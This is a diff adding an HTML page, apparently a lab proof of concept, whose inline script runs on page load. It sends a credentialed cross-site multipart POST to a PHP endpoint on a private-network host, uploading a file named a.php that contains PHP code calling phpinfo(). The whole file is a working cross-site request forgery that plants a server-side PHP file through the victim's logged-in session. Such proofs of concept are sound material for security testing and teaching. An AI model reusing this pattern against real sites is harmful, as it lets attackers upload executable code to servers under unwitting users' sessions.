@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+	<meta charset="UTF-8">
+	<title>csrf ajax test</title>
+	<script>
+		var data = '\
+------WebKitFormBoundary1cNnSgLACWr9SAbh\n\
+Content-Disposition: form-data; name="prof_file"; filename="a.php"\n\
+Content-Type: test/plain\n\
+\n\
+<?php phpinfo(); \n\
+\n\
+------WebKitFormBoundary1cNnSgLACWr9SAbh\n\
+';
+
+	var req = new XMLHttpRequest();
+	req.open('POST', 'http://192.168.46.3/ec_php/kaiin/csrf_ajax_test.php');
+	req.setRequestHeader('Content-Type', 'multipart/form-data; boundary=----WebKitFormBoundary1cNnSgLACWr9SAbh');
+	req.withCredentials = true;
+	req.send(data);
+	</script>
+</head>
+<body>
+	
+</body>
+</html>
